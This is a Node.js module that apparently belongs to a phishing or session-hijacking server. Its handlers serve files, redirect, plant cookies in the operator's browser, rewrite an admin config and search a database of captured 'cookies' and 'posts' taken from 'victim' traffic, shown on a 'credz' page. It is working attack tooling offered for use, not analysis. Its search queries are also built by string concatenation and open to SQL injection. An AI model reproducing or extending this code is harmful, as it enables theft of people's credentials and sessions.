mime_file = fs.readFileSync("./wwwroot/mimetypes.json");
mime_types = JSON.parse(mime_file);
module.exports = {
  redirect: function(redirect_path, humble_response) {
  //  humble_response.write(replace(fs.readFileSync("./resources/redirect_top.html"), "\n", ""));
  //  humble_response.write(redirect_path);
  //  humble_response.write(replace(fs.readFileSync("./resources/redirect_bottom.html"), "\n", ""));
  // humble_response.end()
      humble_response.setHeader("location", redirect_path)
      humble_response.statusCode = 302
      humble_response.end()
  },

  deliver_file: function(file_name, humble_response) {
      try {
        extention = file_name.split('.')[1]
        mime_type = mime_types[extention]
        humble_response.setHeader('content-type', mime_type)
        humble_response.write(fs.readFileSync("./wwwroot/" + file_name));
        humble_response.end()
      } catch(err) {
        console.log(fail + "Coundn't Find  File in wwwroot: " + file_name)
        humble_response.end()
      }
  },

  set_cookie: function(cookie, humble_response) {
      try {
	admin_config.set_admin.switch = false
        humble_response.setHeader("set-cookie", cookie)
	fs.writeFileSync('./admin_config.json', JSON.stringify(admin_config, null, 4));
        humble_response.write(replace(fs.readFileSync("./resources/set_cookie.html"), "\n", ""));
        humble_response.end()
      } catch(err) {
        humble_response.write("problem with config: " + err)
        humble_response.end()
      }
  },

  adminConfig: function(victim_request, humble_response) {
    if (http_method == 'PUT') {
      humble_response.write(JSON.stringify(config));
      humble_response.end()
    }else if (http_method == 'POST') {
      try {
        config = JSON.parse(decodeURIComponent(postData))
	fs.writeFileSync('./config.json', JSON.stringify(config, null, 4));
        console.log(success + "Updated Config File: " + decodeURIComponent(postData))
        humble_response.end("Successfully Saved Config")
      } catch(err) {
        humble_response.write("problem with config: " + err)
        humble_response.end()
      }
    } else {
      humble_response.write(fs.readFileSync("./resources/config_page.html"));
      humble_response.end()
    }
  },

  accessLog: function(victim_request, humble_response) {
    humble_response.write(fs.readFileSync("./resources/log_page_top.html"));
    humble_response.write(fs.readFileSync("./resources/banner.txt"));
    humble_response.write(replace(fs.readFileSync("./logs/access.log"), "\n", "<br>"));
    humble_response.write(fs.readFileSync("./resources/log_page_bottom.html"));
    humble_response.end()
  },

  credsLog: function(victim_request, humble_response) {
    if (http_method == 'POST') {
      //var search_options = decodeURIComponent(postData).split('&')
      var search = JSON.parse(postData)
      db.serialize(function() {
        //let sql = "SELECT * FROM cookies"
        let sql = "SELECT * FROM cookies WHERE timestamp LIKE '%" + search.timestamp + "%' AND domain LIKE '%" + search.domain + "%' AND cookie LIKE '%" + search.data + "%'" 
        let cookies = []
        let posts = []
        db.each(sql, function(err, cookie) {
          cookies.push(cookie)
        });
        //sql = "SELECT * FROM posts"
        sql = "SELECT * FROM posts WHERE timestamp LIKE '%" + search.timestamp + "%' AND domain LIKE '%" + search.domain + "%' AND url LIKE '%" + search.url + "%' AND post LIKE '%" + search.data + "%'" 
        db.each(sql, function(err, post) {
          posts.push(post)
        }, function(){
          humble_response.write(JSON.stringify({"cookies": cookies, "posts": posts}));
          humble_response.end()
        });
      });
    } else {
      humble_response.write(fs.readFileSync("./resources/credz_page.html"));
      humble_response.end()
    }
  }
}
